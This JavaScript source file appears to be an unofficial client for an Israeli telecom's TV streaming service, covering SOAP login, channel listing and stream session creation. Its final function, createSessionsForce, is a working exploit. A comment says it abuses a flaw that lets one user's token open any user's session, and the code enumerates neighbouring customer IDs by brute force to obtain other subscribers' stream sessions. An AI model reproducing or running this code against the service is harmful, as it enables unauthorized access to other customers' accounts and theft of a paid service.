import soap from 'soap';
import xml from 'xml';
import axios from 'axios';
import promiseAny from 'promise-any';

import {login as accountLogin, getTvContractAuthKeys, getTvContractsData} from './my-partner.js';
import PromiseThrottle from 'promise-throttle';

const BASE_URL = 'partner.co.il';

const PUB_BASE_URL = `https://pub.${BASE_URL}`;
const PLUSH_BASE_URL = `https://plush.${BASE_URL}`;
const IFSHY_BASE_URL = `https://ifshy.${BASE_URL}`;
const SNO_BASE_URL = `https://sno.${BASE_URL}`;

const getUserTvData = async (idNumber, lastDigits) => {
    const userAuth = await accountLogin(idNumber, lastDigits);
    const tvAuthKeys = await getTvContractAuthKeys(userAuth);

    return await getTvContractsData(userAuth, tvAuthKeys);
};

const deviceToSoap = ({name, nickName, serial, type, secureId}) => ({
    ClientMsisdn: null,
    DeviceName: name,
    DeviceNickName: nickName,
    DeviceOs: 'Android',
    DeviceOperator: null,
    DeviceSecureId: secureId,
    DeviceSerial: serial,
    DeviceType: type
});

const handleLoginResponse = result => {
    const { Msisdn: userId, Token: token, responseStatus } = result;
    if (responseStatus.status === 'ERROR') {
        const error = new Error(responseStatus.statusMessage || 'Login error');
        error.additionalData = { userId, code: responseStatus.statusCode, message: responseStatus.statusMessage };

        throw error;
    }

    return { userId, token };
}

const loginToTvContract = async (loginSoapClient, {userName, devices}, password) => {
    const ACTION_NAME = 'CheckSubsAuthAndCreateToken';
    
    if (!devices[0]) {
        throw new Error('Cannot find TV device. Please make sure you logged in to the app at least once');
    }

    // The props order matters!
    const loginData = {Password: password, TokenType: 'HOURS24', TvDevice: deviceToSoap(devices[0]), UserName: userName};

    const [loginResponse] = await loginSoapClient[`${ACTION_NAME}Async`]({ request: loginData });

    return handleLoginResponse(loginResponse[`${ACTION_NAME}Result`]);
};

export const login = async (idNumber, lastDigits, password) => {
    const soapUrl = `${PLUSH_BASE_URL}/TVInformation.svc?wsdl`;

    const [loginSoapClient, tvContracts] = await Promise.all([soap.createClientAsync(soapUrl),
                                                              getUserTvData(idNumber, lastDigits)]);

    if (!tvContracts.length) {
        throw new Error('Cannot find TV contract. Please make sure you are registered to the service');;
    }

    // Trying all tv accounts with the given password and waiting for the first successfull one
    try {
        return await promiseAny(tvContracts.map(x => loginToTvContract(loginSoapClient, x, password)));
    } catch (aggregateError) {
        throw aggregateError.errors[0];
    }
};

const generateTokenHeader = token => ({ Authorization: `SeacToken token="${token}"` });

const xmlRequest = (token, config) => axios.request({
    ...config,
    headers: { ...generateTokenHeader(token), 'Content-Type': 'text/xml', ...(config.headers || {}) },
    data: xml(config.data)
});

const queryTraxis = (path, requestConfig, token) => {
    const config = {
        method: 'POST',
        url: `${PUB_BASE_URL}/traxis/web${path}`,
        ...requestConfig
    };

    config.params = {...(config.params || {}), Output: 'json'};

    return xmlRequest(token, config);
};

export const getChannels = async ({ userId, token }) => {
    const queryData = {
        Request: [
            { Identity: [{ CustomerId: userId }] },
            {
                RootRelationQuery: [
                    { _attr: { relationName: 'Channels' } },
                    { Options: [{ Option: [{ _attr: { type: 'Props' } }, 'name,pictures'] }] }
                ]
            }
        ]
    };

    const { data: { Channels: { Channel = [] } = {} } = {} } = await queryTraxis('/Channels', {data: queryData}, token);

    return Channel.map(x => {
        const logoPicture = x.Pictures.Picture.find(y => y.type === 'Logo');
        const logo = logoPicture && logoPicture.Value || null;

        return { id: x.id, name: x.Name, logo };
    });
};


export const searchPrograms = async ({ userId, token }) => {
    // TODO: implememnt according to this:
    // /epg/programs?device=62&locale=en_US&in_channel=61194865&page=1&limit=400&gt_begin=2021-05-06T21%3A00%3A00&lt_begin=2021-05-07T20%3A59%3A59
};

const createSession = async (channelId, { userId, token }, isForTv = false) => {
    const creationData = {
        CreateSession: [
            { ChannelId: channelId }
        ]
    };

    const drm = `${SNO_BASE_URL}/WV/Proxy/DRM?AssetId=${channelId}&RequestType=1&DeviceUID=&RootStatus=false&DRMLevel=3&Roaming=false`;

    const config = {
        params: {CustomerId: userId, SeacToken: token, SeacClass: 'personal'},
        data: creationData,
        ...(isForTv ? {} : {headers: {'User-Agent': 'iFeelSmart-Android_MOBILE_AVC_L3'}})
    };

    try {
        const {data} = await queryTraxis('/Session/propset/all', config, token);;

        return {dashUrl: data.Session.Playlist.Channel.Value, name: `${isForTv ? 'TV' : 'Mobile'}_${userId}`, drm};
    } catch (err) {
        const error = new Error(err.response.data.Error.Message);
        error.additionalData = {...err.response.data.Error};

        throw error;
    }
};

export const createSessions = (...params) => {
    const tvSession = createSession(...params, true);
    const mobileSession = createSession(...params);

    return Promise.all([tvSession, mobileSession]);
};

// This exploits a vulnerability where the same token can be used to fetch any user's session
export const createSessionsForce = async (channelId, {userId: strUserId, token}) => {
    const NUMBER_OF_TRIES = parseInt(process.env.BRUTE_FORCE_TRIES) ?? 50;
    const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
    const WAIT = parseInt(process.env.BRUTE_FORCE_WAIT_MS) ?? 250;
    const userId = parseInt(strUserId); 

    const promiseThrottle = new PromiseThrottle({requestsPerSecond: WAIT === 0 ? Number.MAX_SAFE_INTEGER : 1000 / WAIT});

    const promises = [];

    for (let i = userId - TRIES_EACH_DIRECTION; i <= userId + TRIES_EACH_DIRECTION; i++) {
        const pt = promiseThrottle.add(() => createSessions(channelId, { userId: i, token })
            .then(sessions => {
                console.log(sessions);

                return sessions;
            }));

        promises.push(pt);
    }

    return promiseAny(promises).catch(() => []);
};